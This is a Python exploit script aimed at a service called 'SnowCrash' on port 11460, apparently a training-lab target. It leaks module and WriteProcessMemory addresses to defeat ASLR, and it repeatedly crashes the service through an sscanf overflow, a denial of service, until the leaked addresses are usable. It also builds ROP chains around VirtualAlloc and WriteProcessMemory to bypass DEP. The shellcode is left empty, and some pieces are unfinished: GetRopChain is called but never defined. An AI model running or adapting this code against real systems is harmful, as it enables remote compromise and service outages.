from __future__ import annotations

import socket
import sys
import struct
import time


# Vulnerable sscanf(...);
# opcode = 0x534
# cbBuffer = 0x300
# offsetEip = 276

class SnowCrashVulnService:

    SSCANF = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d"
    CB_SSCANF = len(SSCANF)
    OFFSET_TO_DEBUG_DOS = 1000
    CBMAX = 0x100000

    __opcode = 0
    __offsetOne = 0
    __offsetTwo = 0
    __offsetThree = 0
    __cbBufferOne = 0
    __cbBufferTwo = 0
    __cbBufferThree = 0

    __psAgentHeader = b""
    __psAgentBuffer = b""

    __cbPayload = 0
    __payload = b""

    __symbolOperation = b""

    def ClearAll(self):
        self.__opcode = 0
        self.__offsetOne = 0
        self.__offsetTwo = 0
        self.__offsetThree = 0
        self.__cbBufferOne = 0
        self.__cbBufferTwo = 0
        self.__cbBufferThree = 0
        self.__psAgentHeader = b""
        self.__psAgentBuffer = b""
        self.__cbPayload = 0
        self.__payload = b""
        self.__symbolOperation = b""

    def CreatePsAgentCommandHeader(self):
        value_positions = {
            0x44: self.GetOpcode(),
            0x45: self.GetOffsetOne(),
            0x46: self.GetCbBufferOne(),
            0x47: self.GetOffsetTwo(),
            0x48: self.GetCbBufferTwo(),
            0x49: self.GetOffsetThree(),
            0x4a: self.GetCbBufferThree(),
        }

        psAgentCommandHeader = b""
        n = 12
        for i in range(1, n+1):
            val = 0x40 + i
            if val in value_positions:
                psAgentCommandHeader += struct.pack("<i", value_positions[val])
            else:
                psAgentCommandHeader += bytes([val]) * 4

        self.SetPsAgentHeader(psAgentCommandHeader)

    def SetSymbolOperation(self, symbol):
        self.__symbolOperation = b"SymbolOperation" + symbol + b"\x00"

    def GetSymbolOperation(self):
        return self.__symbolOperation

    def SetCbPayload(self, cbPayload):
        self.__cbPayload = struct.pack(">I", cbPayload)  # sz first 4 bytes

    def GetCbPayload(self):
        return self.__cbPayload

    def SetPayload(self):
        self.__payload = (
            self.GetCbPayload() +
            self.GetPsAgentHeader() +
            self.GetPsAgentBuffer()
        )

    def GetPayload(self):
        return self.__payload

    def SetPsAgentBuffer(self, psAgentBuffer):
        self.__psAgentBuffer = psAgentBuffer

    def SetPsAgentHeader(self, psAgentHeader):
        self.__psAgentHeader = psAgentHeader

    def GetPsAgentBuffer(self):
        return self.__psAgentBuffer

    def GetPsAgentHeader(self):
        return self.__psAgentHeader

    def GetOffsetOne(self):
        return self.__offsetOne

    def SetOffsetOne(self, offsetOne):
        self.__offsetOne = offsetOne

    def GetOffsetTwo(self):
        return self.__offsetTwo

    def SetOffsetTwo(self, offsetTwo):
        self.__offsetTwo = offsetTwo

    def GetOffsetThree(self):
        return self.__offsetThree

    def SetOffsetThree(self, offsetThree):
        self.__offsetThree = offsetThree

    def GetCbBufferOne(self):
        return self.__cbBufferOne

    def SetCbBufferOne(self, cbBufferOne):
        self.__cbBufferOne = cbBufferOne

    def GetCbBufferTwo(self):
        return self.__cbBufferTwo

    def SetCbBufferTwo(self, cbBufferTwo):
        self.__cbBufferTwo = cbBufferTwo

    def GetCbBufferThree(self):
        return self.__cbBufferThree

    def SetCbBufferThree(self, cbBufferThree):
        self.__cbBufferThree = cbBufferThree

    def SetOpcode(self, opcode):
        self.__opcode = opcode

    def GetOpcode(self):
        return self.__opcode

    def SetAllBuffers(self, cbBuffer):
        self.SetCbBufferOne(cbBuffer)
        self.SetCbBufferTwo(cbBuffer)
        self.SetCbBufferThree(cbBuffer)

    def SetAllOffsets(self, offset):
        self.SetOffsetOne(offset)
        self.SetOffsetTwo(offset)
        self.SetOffsetThree(offset)

    def ParseResponse(self, response):
        """ Parse a server response and extract the leaked address """
        pattern = b"Address is:"
        address = None
        for line in response.split(b"\n"):
            if line.find(pattern) != -1:
                address = int((line.split(pattern)[-1].strip()), 16)
        if not address:
            print("[-] Could not find the address in the Response")
            sys.exit()

        return address

    def CreateSymbolPayload(self, symbol, cbBuffer=0x100):
        print("[+] Creating symbol operation payload")

        self.SetOpcode(0x2000)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(cbBuffer)

        self.CreatePsAgentCommandHeader()
        self.SetSymbolOperation(symbol)
        self.SetCbPayload(cbBuffer)

        padding = b"\x90" * (
            cbBuffer - (
                len(self.GetPsAgentHeader()) +
                len(self.GetSymbolOperation())
            )
        )

        self.SetPsAgentBuffer(
            self.GetSymbolOperation() +
            padding
        )

        self.SetPayload()

    def CreateDosPayload(self):
        print("[+] Creating Denial of Service Payload in sscanf")

        self.SetOpcode(0x534)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(0x123)

        self.CreatePsAgentCommandHeader()
        self.SetCbPayload(0x4400)

        padding = b"\x90" * \
            (0x4404 - (len(self.GetPsAgentHeader()) + self.CB_SSCANF) + 2)

        buffer = self.SSCANF % (padding, 0, 0, 0, 0)

        self.SetPsAgentBuffer(buffer)
        self.SetPayload()


class SnowCrashASLR:

    __symbol = b""
    __address = 0
    __addressBase = 0
    __addressOffset = 0

    def __init__(self, exploit: SnowCrashExploit):
        self.__symbol = 0
        self.exploit = exploit

    def ClearAll(self):
        self.__symbol = b""
        self.__address = 0
        self.__addressBase = 0
        self.__addressOffset = 0

    def SetSymbol(self, symbol):
        self.__symbol = symbol

    def GetSymbol(self):
        return self.__symbol

    def SetAddress(self, address):
        self.__address = struct.pack('>I', address)

    def GetAddress(self):
        return self.__address

    def SetAddressOffset(self, offset):
        self.__addressOffset = struct.pack('>h', offset)

    def GetAddressOffset(self):
        return self.__addressOffset

    def SetAddressBase(self):
        address_int = int.from_bytes(
            self.GetAddress(),
            byteorder='big'
        )

        offset_int = int.from_bytes(
            self.GetAddressOffset(),
            byteorder='big'
        )

        base_address_int = address_int - offset_int
        self.__addressBase = base_address_int.to_bytes(4, byteorder='big')

    def GetAddressBase(self):
        return self.__addressBase

    def LeakFuncAddr(self, symbol):
        """ for leaking the address of a given symbol """
        self.SetSymbol(symbol)

        self.exploit.service.CreateSymbolPayload(
            self.GetSymbol()
        )

        self.exploit.net.SendPayload(
            self.exploit.service.GetPayload()
        )

        response = self.exploit.net.RecvResponse()
        self.SetAddress(
            self.exploit.service.ParseResponse(response)
        )

    def HasAddressBadChar(self, badchars):
        """ check address for bad chars """
        hasBadChar = False

        for i in range(2):  # Check the first two bytes
            byte = self.GetAddressBase()[i:i+1]
            print(f"[+] Checking character {byte.hex()}")
            if byte in badchars:
                print(f"[-] Address contains bad character {byte.hex()}")
                hasBadChar = True

                break

        return hasBadChar

    def printer(self, appendTo):
        printStr = appendTo + "\n"\
            f" - Address: {self.GetAddress().hex()}\n" +\
            f" - Address Offset: {self.GetAddressOffset().hex()}\n" +\
            f" - Module Address Base: {self.GetAddressBase().hex()}\n"

        print(printStr)


class SnowCrashDEP:
    __stub = b""

    __codeCaveOffset = 0
    __dataSectonOffset = 0

    def __init__(self, exploit: SnowCrashExploit, dllBase=bytes(4)):
        self.exploit = exploit
        self.dllBase = int.from_bytes(dllBase, 'big')

    def GetStub(self):
        return self.__stub

    def SetStub(self, stub):
        self.__stub = stub

    def SetDataSectionOffset(self, dataSection):
        self.__dataSectonOffset = dataSection

    def GetDataSectionOffset(self):
        return self.__dataSectonOffset

    def SetCodeCaveOffset(self, codeCave):
        self.__codeCaveOffset = codeCave

    def GetCodeCaveOffset(self):
        return self.__codeCaveOffset

    def BuildAslrWriteProcessMemoryPlaceHolder(self, WPMAddress):

        codeCave = self.dllBase + self.GetCodeCaveOffset()
        dataSection = self.dllBase + self.GetDataSectionOffset()
        padding = 0x20

        struct.pack('<L', self.dllBase + 0x408d6)       # push esp ; pop esi ; ret

        stub = b""
        stub += WPMAddress  # WriteProcessMemory
        stub += struct.pack(">I", codeCave + padding)   # Ret to shellcode
        stub += struct.pack(">I", 0xffffffff)           # hProcess
        stub += struct.pack(">I", codeCave)             # lpBaseAddress
        stub += struct.pack(">I", 0x41414141)           # lpBuffer
        stub += struct.pack(">I", 0x42424242)           # nSize
        stub += struct.pack(">I", dataSection)          # *lpNumberOfBytesWritten

        self.SetStub(stub)

    def GetVirtualAllocPlaceHolder(self) -> str:
        # 0x14 dummy VirutalAlloc Address
        va = struct.pack("<L",  (0x45454545))
        va += struct.pack("<L", (0x46464646))  # 0x10 Shellcode Return Address
        va += struct.pack("<L", (0x47474747))  # 0x0c dummy Shellcode Address
        va += struct.pack("<L", (0x48484848))  # 0x08 dummy dwSize
        va += struct.pack("<L", (0x49494949))  # 0x04 dummy flAllocationType
        va += struct.pack("<L", (0x51515151))  # 0x0 dummy flProtect

        return va

    def BuildRopChainVirtualAlloc(self) -> str:
        # get the address of our stack
        # push esp ; push eax ; pop edi ; pop esi ; ret
        ropChain = struct.pack('<L', (0x50501110))
        # mov eax, esi ; pop esi ; ret
        ropChain += struct.pack('<L', (0x5050118e))
        ropChain += struct.pack('<L', (0x41414141))

        # set the stack offset to the start of our GetVirtualAllocPlaceHolder
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack("<L", (0xffffffe4))  # -0x1C
        ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # put the actual address of VirtualAlloc into the current offset for GetVirtualAllocPlaceHolder
        ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
        # 5054A220 + 1 VirtualAlloc
        ropChain += struct.pack('<L', (0x5054A221))
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack("<L", (0xffffffff))  # -1
        ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
        # mov eax, dword [eax] ; ret
        ropChain += struct.pack('<L', (0x5051f278))
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))
        # mov eax, esi ; pop esi ; ret
        ropChain += struct.pack('<L', (0x5050118e))
        ropChain += struct.pack('<L', (0x41414141))

        return ropChain

    def BuildRopChainShellCodeRet(self) -> str:
        # increment the stack to ShellCodeRet
        ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

        # put a copy of our current stack address in esi
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # This is an offset of cbRopchain + n from the address of [Shellcode Return Address] on the stack.
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack('<L', (0xfffffea4))  # offset
        ropChain += struct.pack('<L', (0x50533bea))  # sub eax, ecx ; ret
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))
        ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret

        return ropChain

    def BuildRopChainShellCodeAddr(self) -> str:
        # increment the stack to ShellCodeAddr
        ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

        # put a copy of our current stack address in esi
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # This is an offset of from where we are to the address of [Shellcode Return Address] on the stack.
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack('<L', (0xfffffea8))  # offset
        ropChain += struct.pack('<L', (0x50533bea))  # sub eax, ecx ; ret
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))
        ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret

        return ropChain

    def BuildRopChainDwSize(self) -> str:
        # increment the stack to dwSize
        ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

        # put a copy of our current stack address in esi
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # put the value 0x1000 into our stack address dwSize
        ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
        ropChain += struct.pack('<L', (0xffffffff))
        ropChain += struct.pack('<L', (0x5051d0ec))  # neg eax ; ret
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))
        # mov eax, esi ; pop esi ; ret
        ropChain += struct.pack('<L', (0x5050118e))
        ropChain += struct.pack('<L', (0x41414141))

        return ropChain

    def BuildRopChainFlAllocationType(self) -> str:
        # increment the stack to FlAllocationType
        ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

        # put a copy of our current stack address in esi
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # bp 0x50514394 ".if (@ecx & 0x0`ffffffff) = 0x41414141 {} .else {gc}"
        # put the value 0x1000 into our stack address FlAllocationType
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack('<L', (0xbebecebf))
        ropChain += struct.pack('<L', (0x505412f9))  # mov eax, ecx ; ret
        ropChain += struct.pack('<L', (0x50514394))  # pop ecx ; ret
        ropChain += struct.pack('<L', (0x41414141))
        ropChain += struct.pack('<L', (0x5051579a))  # add eax, ecx ; ret
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))
        # mov eax, esi ; pop esi ; ret
        ropChain += struct.pack('<L', (0x5050118e))
        ropChain += struct.pack('<L', (0x41414141))

        return ropChain

    def BuildRopChainFlProtect(self) -> str:
        # increment the stack to FlProtec
        ropChain = struct.pack('<L', (0x50514886))   # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret
        ropChain += struct.pack('<L', (0x50514886))  # inc eax ; ret

        # put a copy of our current stack address in esi
        ropChain += struct.pack('<L', (0x5052f773))  # push eax ; pop esi ; ret

        # put the value 0x40 into our stack address FlProtec
        ropChain += struct.pack('<L', (0x5053a0f5))  # pop eax ; ret
        ropChain += struct.pack('<L', (0xffffffc0))
        ropChain += struct.pack('<L', (0x5051d0ec))  # neg eax ; ret
        # mov dword [esi], eax ; ret
        ropChain += struct.pack('<L', (0x5051cbb6))

        return ropChain

    def SwapEsiEsp(self):
        # Assume esi has the stack address at the end of our function call on the stack
        # mov eax,esi ; pop esi ; retn
        ropChain = struct.pack("<L", (0x5050118e))
        ropChain += struct.pack("<L", (0x41414141))  # junk
        ropChain += struct.pack("<L", (0x505115a3))  # pop ecx ; ret
        ropChain += struct.pack("<L", (0xffffffe8))  # negative offset value
        ropChain += struct.pack("<L", (0x5051579a))  # add eax, ecx ; ret
        ropChain += struct.pack("<L", (0x5051571f))  # xchg eax, ebp ; ret
        # mov esp, ebp ; pop ebp ; ret
        ropChain += struct.pack("<L", (0x50533cbf))
        return ropChain

    def BuildRopChain(self):
        ropChain = self.BuildRopChainVirtualAlloc()
        ropChain += self.BuildRopChainShellCodeRet()
        ropChain += self.BuildRopChainShellCodeAddr()
        ropChain += self.BuildRopChainDwSize()
        ropChain += self.BuildRopChainFlAllocationType()
        ropChain += self.BuildRopChainFlProtect()
        ropChain += self.SwapEsiEsp()

        ropChain += b"\x90" * 0x24

        return ropChain


class SnowCrashShellcode:
    def GetShellCode(self):
        buf = b""
        return buf


class SnowCrashNet:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.sock = -1

    def ConnectServerCreateSocket(self, timeout=10):
        while True:
            self.CreateSocket(timeout)
            try:
                self.sock.connect((self.ip, self.port))
                break
            except socket.error as e:
                print("[+] Attempting to establish connection")
                time.sleep(timeout)
        print("[+] Connection esablished")

    def CreateSocket(self, timeout):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)

    def GetSocket(self):
        return self.sock

    def RecvResponse(self):
        response = self.sock.recv(0x1024)
        print("[+] Response Received")

        return response

    def SendPayload(self, payload):
        self.sock.send(payload)
        print("[+] Packet sent")


class SnowCrashExploit:
    __offsetEip = 0x00
    __nopsled = b""

    def __init__(
            self,
            vulnService: SnowCrashVulnService = None,
            shellcode=SnowCrashShellcode(),
            network=SnowCrashNet("", 0),
            dep=None,
            aslr=None
    ):
        self.service = vulnService
        self.shellcode = shellcode
        self.net = network
        self.dep = dep if dep is not None else SnowCrashDEP(self)
        self.aslr = aslr if aslr is not None else SnowCrashASLR(self)

    def SetExploitPayload(self, offsetEip):
        self.SetNopSled(offsetEip)

    def GetExploitPayload(self):
        return self.GetNopSled() + self.dep.GetRopChain() + self.shellcode.GetShellCode()

    def GetNopSled(self):
        return self.__nopsled

    def SetNopSled(self, cbNopSled):
        self.__nopsled = b"\x90" * cbNopSled

    def GetOffsetEip(self):
        return self.__offsetEip

    def SetOffsetEip(self):
        return self.__offsetEip

    def SetDEP(self, dep: SnowCrashDEP):
        self.dep = dep

    def SetASLR(self, aslr: SnowCrashASLR):
        self.aslr = aslr


badChars = [
    b"\x00", b"\x09", b"\x0A", b"\x0C",
    b"\x0D", b"\x20", b"\x40",
]


def GetAslrBase(sploit, funcAddr, badCharFlag=True):
    net = sploit.net
    aslr = sploit.aslr
    service = sploit.service

    while (1):
        if net.GetSocket() != -1:
            net.GetSocket().close()
            time.sleep(5)

        aslr.ClearAll()
        service.ClearAll()

        net.ConnectServerCreateSocket()

        aslr.SetAddressOffset(0x14E0)
        aslr.LeakFuncAddr(funcAddr)
        aslr.SetAddressBase()

        if (badCharFlag and aslr.HasAddressBadChar(badChars)):
            service.CreateDosPayload()
            net.SendPayload(sploit.service.GetPayload())
            time.sleep(15)

        else:
            break
    aslr.printer("[+] ASLR Information: ")

    return aslr.GetAddressBase()


def main(sploit):
    print("\n[+] Establishing dll Base for DEP")
    dllBase = GetAslrBase(sploit, b"N98E_CRYPTO_get_new_lockid")

    sploit.SetDEP(
        SnowCrashDEP(
            sploit,
            dllBase
        )
    )

    sploit.dep.SetCodeCaveOffset(0x92c04)
    sploit.dep.SetDataSectionOffset(0xe401c)

    print("[+] Getting absolute address of WriteProcessMemory")
    GetAslrBase(sploit, b"WriteProcessMemory", False)
    WPMAddress = sploit.aslr.GetAddress()

    print("[+] Restoring dll base for DEP")
    GetAslrBase(sploit, b"N98E_CRYPTO_get_new_lockid", False)

    sploit.dep.BuildAslrWriteProcessMemoryPlaceHolder(WPMAddress)

    sploit.net.GetSocket().close()
    sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} target.ip")
        ip = "192.168.211.10"
    else:
        ip = sys.argv[1]

    sploit = SnowCrashExploit(
        SnowCrashVulnService(),
        SnowCrashShellcode(),
        SnowCrashNet(
            ip,
            11460
        ),
    )

    main(sploit)
